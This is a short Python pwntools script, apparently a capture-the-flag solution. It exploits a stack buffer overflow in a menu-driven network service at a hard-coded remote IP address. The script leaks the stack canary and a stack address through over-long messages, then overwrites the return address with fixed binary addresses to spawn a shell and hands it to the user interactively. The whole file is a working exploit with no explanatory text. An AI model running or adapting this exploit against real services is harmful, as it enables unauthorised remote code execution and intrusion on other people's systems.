#!/usr/bin/env python
from pwn import *
import time

r = remote('110.10.212.130', 8888)

r.recvuntil('Select menu > ')
r.send('1\n')
r.recvuntil('Input Your Message : ')
r.send('a' * 41)
r.recvuntil('a' * 41)
canary = '\x00' + r.recvuntil('\n===============================\n')[:3]
print 'Canary', repr(canary)

r.recvuntil('Select menu > ')
r.send('1\n')
r.recvuntil('Input Your Message : ')
r.send('a' * 52)
r.recvuntil('a' * 52)
stack = u32(r.recvn(4))
buf = stack - 0x130
print 'Buf', hex(buf)

r.recvuntil('Select menu > ')
r.send('1\n')
r.recvuntil('Input Your Message : ')
r.send('A'*40 + canary + 'b' * 12 + p32(0x8048620) + p32(0x8048640) + p32(buf) + 'sh<&4 >&4\0')

r.recvuntil('Select menu > ')
r.send('3\n')

r.interactive()
